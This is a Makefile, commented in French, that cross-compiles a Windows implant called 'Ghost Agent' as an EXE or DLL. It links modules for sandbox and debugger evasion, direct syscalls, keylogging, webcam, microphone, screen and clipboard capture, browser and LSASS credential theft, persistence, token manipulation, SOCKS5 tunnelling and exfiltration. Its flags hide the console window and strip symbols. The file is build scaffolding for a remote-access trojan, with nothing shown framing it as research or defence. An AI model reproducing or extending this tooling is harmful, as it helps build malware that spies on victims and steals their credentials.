# ============================================================================
# Makefile pour Ghost Agent
# 
# Target: Windows x64
# Compiler: MinGW-w64 (cross-compilation depuis Mac/Linux)
# Date: Janvier 2026
# ============================================================================

# Compiler
CC = x86_64-w64-mingw32-gcc
WINDRES = x86_64-w64-mingw32-windres

# Flags de compilation
CFLAGS = -Wall -Wextra -O2 -std=c11
CFLAGS += -I./include -I./src

# Flags pour cacher la console et strip les symbols
LDFLAGS = -s -mwindows
LDFLAGS += -lwinhttp -lws2_32 -ladvapi32 -lvfw32 -lole32 -luuid -lgdiplus -lcrypt32 -ldbghelp -lshlwapi

# Flags de debug (décommenter pour debug)
# CFLAGS += -g -DDEBUG
# LDFLAGS = -lwinhttp -lws2_32 -ladvapi32

# Directories
SRC_DIR = src
BUILD_DIR = build
BIN_DIR = bin

# Fichiers sources
CORE_SRC = $(SRC_DIR)/main.c \
           $(SRC_DIR)/core/config.c \
           $(SRC_DIR)/core/demon.c \
           $(SRC_DIR)/core/auth.c

CRYPTO_SRC = $(SRC_DIR)/crypto/aes.c \
             $(SRC_DIR)/crypto/xor.c \
             $(SRC_DIR)/crypto/base64.c

UTILS_SRC = $(SRC_DIR)/utils/memory.c \
            $(SRC_DIR)/utils/strings.c \
            $(SRC_DIR)/utils/peb.c

EVASION_SRC = $(SRC_DIR)/evasion/syscalls.c \
              $(SRC_DIR)/evasion/antidebug.c \
              $(SRC_DIR)/evasion/sandbox.c \
              $(SRC_DIR)/evasion/sleep.c

NETWORK_SRC = $(SRC_DIR)/network/transport.c \
              $(SRC_DIR)/network/profile.c \
              $(SRC_DIR)/network/socks5.c

TASKS_SRC = $(SRC_DIR)/tasks/dispatcher.c \
            $(SRC_DIR)/tasks/handlers/shell.c \
            $(SRC_DIR)/tasks/handlers/file.c \
            $(SRC_DIR)/tasks/handlers/process.c \
            $(SRC_DIR)/tasks/handlers/recon.c \
            $(SRC_DIR)/tasks/handlers/persist.c \
            $(SRC_DIR)/tasks/handlers/token.c

SURVEILLANCE_SRC = $(SRC_DIR)/surveillance/keylogger.c \
                   $(SRC_DIR)/surveillance/screenshot.c \
                   $(SRC_DIR)/surveillance/clipboard.c \
                   $(SRC_DIR)/surveillance/webcam.c \
                   $(SRC_DIR)/surveillance/microphone.c

REMOTE_SRC = $(SRC_DIR)/remote/desktop.c

CREDENTIALS_SRC = $(SRC_DIR)/credentials/browser.c \
                  $(SRC_DIR)/credentials/lsass.c

EXFIL_SRC = $(SRC_DIR)/exfil/exfil.c

ALL_SRC = $(CORE_SRC) $(CRYPTO_SRC) $(UTILS_SRC) $(EVASION_SRC) $(NETWORK_SRC) $(TASKS_SRC) $(SURVEILLANCE_SRC) $(REMOTE_SRC) $(CREDENTIALS_SRC) $(EXFIL_SRC)

# Fichiers objets
OBJ = $(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.o,$(ALL_SRC))

# Targets
EXE_TARGET = $(BIN_DIR)/ghost.exe
DLL_TARGET = $(BIN_DIR)/ghost.dll

# ============================================================================
# Rules
# ============================================================================

.PHONY: all clean exe dll dirs

all: dirs exe

exe: CFLAGS += -DBUILD_EXE
exe: dirs $(EXE_TARGET)
	@echo "[+] Built EXE: $(EXE_TARGET)"

dll: CFLAGS += -DBUILD_DLL
dll: LDFLAGS += -shared
dll: dirs $(DLL_TARGET)
	@echo "[+] Built DLL: $(DLL_TARGET)"

dirs:
	@mkdir -p $(BUILD_DIR)/core
	@mkdir -p $(BUILD_DIR)/crypto
	@mkdir -p $(BUILD_DIR)/utils
	@mkdir -p $(BUILD_DIR)/evasion
	@mkdir -p $(BUILD_DIR)/network
	@mkdir -p $(BUILD_DIR)/tasks/handlers
	@mkdir -p $(BUILD_DIR)/surveillance
	@mkdir -p $(BUILD_DIR)/remote
	@mkdir -p $(BUILD_DIR)/credentials
	@mkdir -p $(BUILD_DIR)/exfil
	@mkdir -p $(BIN_DIR)

$(EXE_TARGET): $(OBJ)
	@echo "[*] Linking EXE..."
	$(CC) $(OBJ) -o $@ $(LDFLAGS)

$(DLL_TARGET): $(OBJ)
	@echo "[*] Linking DLL..."
	$(CC) $(OBJ) -o $@ $(LDFLAGS)

$(BUILD_DIR)/%.o: $(SRC_DIR)/%.c
	@echo "[*] Compiling $<..."
	$(CC) $(CFLAGS) -c $< -o $@

clean:
	@echo "[*] Cleaning..."
	rm -rf $(BUILD_DIR) $(BIN_DIR)
	@echo "[+] Clean complete"

# ============================================================================
# Helper targets
# ============================================================================

# Vérifie que MinGW est installé
check:
	@which $(CC) > /dev/null 2>&1 || (echo "[-] MinGW not found. Install with: brew install mingw-w64" && exit 1)
	@echo "[+] MinGW found: $(shell which $(CC))"

# Affiche les infos de compilation
info:
	@echo "Compiler: $(CC)"
	@echo "CFLAGS:   $(CFLAGS)"
	@echo "LDFLAGS:  $(LDFLAGS)"
	@echo "Sources:  $(ALL_SRC)"
	@echo "Objects:  $(OBJ)"

# Build tout (exe + dll)
release: clean exe dll
	@echo "[+] Release build complete"
	@ls -la $(BIN_DIR)
